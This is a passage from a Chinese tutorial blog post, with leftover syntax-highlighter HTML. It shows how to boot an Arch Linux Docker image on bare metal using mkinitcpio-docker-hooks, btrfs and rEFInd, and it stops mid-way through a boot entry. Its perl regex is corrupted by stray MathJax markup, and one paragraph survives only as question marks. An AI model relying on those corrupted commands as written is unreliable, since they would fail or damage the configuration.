title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nRUN sudo -u user yaourt -S --noconfirm mkinitcpio-docker-hooks</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f21613753754-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1be0f21613753754-1\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">sudo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">user </span><span class=\"crayon-v\">yaourt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">noconfirm </span><span class=\"crayon-v\">mkinitcpio</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">hooks</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>安装完了<code>mkinitcpio-docker-hooks</code>以后还需要配置，配置文件在<code>/etc/docker-btrfs.json</code>，初始内容如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1be0f24910566730\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n{\r\n    \"docker_image\": \"archlinux/base\",\r\n    \"docker_tag\": \"latest\"\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f24910566730-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1be0f24910566730-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f24910566730-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1be0f24910566730-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1be0f24910566730-1\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1be0f24910566730-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"docker_image\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"archlinux/base\"</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1be0f24910566730-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"docker_tag\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"latest\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1be0f24910566730-4\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>我们需要做的就是把这两个变量的值替换为我们想要的值，比如说这里我打算把我的docker镜像的名字叫做“sample_image”。同时，我们还需要在<code>/etc/mkinitcpio.conf</code>中添加<code>docker-btrfs</code>这个hook。<br>\n综上，可以在Dockerfile中使用如下命令来配置：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1be0f28955483112\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nRUN sed -i 's/archlinux\\/base/sample_image/g' /etc/docker-btrfs.json\r\nRUN perl -i -p -e 's/(?&lt;=^HOOKS=<span class=\"MathJax_Preview\">\\()(.*)(?=\\)</span>)/$1 docker-btrfs/g' /etc/mkinitcpio.conf</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f28955483112-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1be0f28955483112-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1be0f28955483112-1\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">sed</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'s/archlinux\\/base/sample_image/g'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">btrfs</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">json</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1be0f28955483112-2\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">perl</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">e</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'s/(?&lt;=^HOOKS=<span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span>(.*)(?=<span class=\"MathJax_Preview\">\\()/$1 docker-btrfs/g'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mkinitcpio</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">conf</span></span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0082 seconds] -->\r\n<p>??????????????Dockerfile??</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1be0f2b746215115\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"?????\"></span><div class=\"crayon-button crayon-nums-button\" title=\"?????????\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"???????\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"??????\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"??????\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"????\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"?????????\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nFROM zasdfgbnm/archlinux-yaourt\r\nUSER root\r\nRUN pacman -Syu --noconfirm base\r\nRUN sudo -u user yaourt -S --noconfirm mkinitcpio-docker-hooks\r\nRUN sed -i 's/archlinux\\/base/sample_image/g' /etc/docker-btrfs.json\r\nRUN perl -i -p -e 's/(?&lt;=^HOOKS=\\))(.*)(?=<span class=\"MathJax_Preview\">\\()/$1 docker-btrfs/g' /etc/mkinitcpio.conf</span></textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f2b746215115-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1be0f2b746215115-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f2b746215115-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1be0f2b746215115-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f2b746215115-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1be0f2b746215115-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1be0f2b746215115-1\"><span class=\"crayon-e\">FROM </span><span class=\"crayon-v\">zasdfgbnm</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">archlinux</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">yaourt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1be0f2b746215115-2\"><span class=\"crayon-e\">USER </span><span class=\"crayon-e\">root</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1be0f2b746215115-3\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">pacman</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">Syu</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">noconfirm </span><span class=\"crayon-e\">base</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1be0f2b746215115-4\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">sudo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">user </span><span class=\"crayon-v\">yaourt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">noconfirm </span><span class=\"crayon-v\">mkinitcpio</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">hooks</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1be0f2b746215115-5\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">sed</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'s/archlinux\\/base/sample_image/g'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">btrfs</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">json</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1be0f2b746215115-6\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">perl</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">e</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'s/(?&lt;=^HOOKS=<span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span>(.*)(?=\\)</span>)/$1 docker-btrfs/g'<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mkinitcpio</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">conf</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p>\n</p></div>\n<div>\n<p>只需要通过<code>docker build . -t sample_image</code>就可以构建自己的镜像了。</p>\n<h2 id=\"准备内核跟initramfs\">准备内核跟initramfs</h2>\n<p>镜像生成好了以后，下一步就是准备内核跟构建initramfs了。注意这一步操作尽量在你打算用来启动docker镜像的机器上进行，因为mkinitcpio会自动根据机器把相应的内核模块放入initramfs中去，如果在别的机器上进行的话，那就可能会有一些驱动没有被自动装入initramfs中。如前所述，这一步的工作是在docker容器中进行的。首先运行容器并开启一个shell：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1be0f2f773329681\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndocker run -v $(pwd):/workspace -w /workspace -it sample_image bash</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f2f773329681-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1be0f2f773329681-1\"><span class=\"crayon-e\">docker </span><span class=\"crayon-v\">run</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pwd</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">workspace</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">workspace</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">it </span><span class=\"crayon-e\">sample_image </span><span class=\"crayon-v\">bash</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>然后在容器中执行如下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1be0f32671346421\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmkinitcpio -p linux\r\ncp /boot/* .\r\nexit</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f32671346421-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1be0f32671346421-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1be0f32671346421-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1be0f32671346421-1\"><span class=\"crayon-v\">mkinitcpio</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">linux</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1be0f32671346421-2\"><span class=\"crayon-v\">cp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">boot</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1be0f32671346421-3\"><span class=\"crayon-v\">exit</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>然后就可以在当前目录下看到准备好的<code>initramfs-linux-fallback.img</code>、<code>initramfs-linux.img</code>以及<code>vmlinuz-linux</code>了。</p>\n<h2 id=\"准备top-layer的内容\">准备top layer的内容</h2>\n<p>Top layer是<code>mkinitcpio-docker-hooks</code>引入的新概念，它指的是某个驱动器中的某个目录，这个目录会在启动的时候读写层创建之后，真正的root挂载之前，通过busybox的<code>cp -a</code>命令整个拷贝到读写层里面去。为什么需要top layer呢？因为我们需要在多台机器上启动同一个镜像，而不同机器上的往往会根据需要配置不同的配置文件，比如<code>/etc/fstab</code>以及<code>/etc/X11/xorg.conf</code>。另外，DockerHub免费账户上的镜像都是公开的，<code>/etc/passwd</code>、<code>/etc/shadow</code>等的私密性文件也不适合放在镜像里面存储。</p>\n<p>准备top layer的内容，实际上就是找一个文件夹，把需要单独配置的文件，按照从根目录算起的相对路径存放在这个文件夹里面。比如说如果你想给某台机器单独配置<code>/etc/fstab</code>，那么你就应该在top layer的目录中添加<code>etc/fstab</code>这个文件。这里推荐的具体的操作流程是：首先通过<code>docker run -v $(pwd):/workspace -w /workspace -it sample_image bash</code>进入容器中的shell，然后在其中做各种配置，比如<code>useradd ...</code>，完了以后把新生成的配置文件拷贝到top layer的文件夹中去</p>\n<h2 id=\"设置启动管理器\">设置启动管理器</h2>\n<p>设置好了top layer以后，我们基本上可以算是万事具备只差东风了。我们只需要简单设置一下启动管理器就可以启动我们的系统了。这里以refind为例子，这里假设我们的所有东西放在一个label为“linux”的btrfs分区中，docker目录（也就是你系统启动以后会挂载到<code>/var/lib/docker</code>的目录）存放在这个分区根目录下的一个叫做“docker”的子卷中，而内核、initramfs以及top layer都是位于分区根目录下的“boot_docker”文件夹中，而我们希望创建的读写层名字叫做“docker_rwlayer”，那么相应的<code>refind.conf</code>中的菜单项的代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1be0f37163780007\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmenuentry archlinux-docker {\r\n        icon EFI/refind/icons/os_arch.png\r\n        volume linux\r\n        loader boot_docker/vmlinuz-linux\r\n        initrd boot_docker/initramfs-linux.img\r\n        options \"root=LABEL=linux rootflags=subvol=docker_rwlayer rw docker_path=docker toplayer=LABEL=linux toplayer_path=boot_docker\"\r\n}</textarea></div>\r\n\t\t\t<div 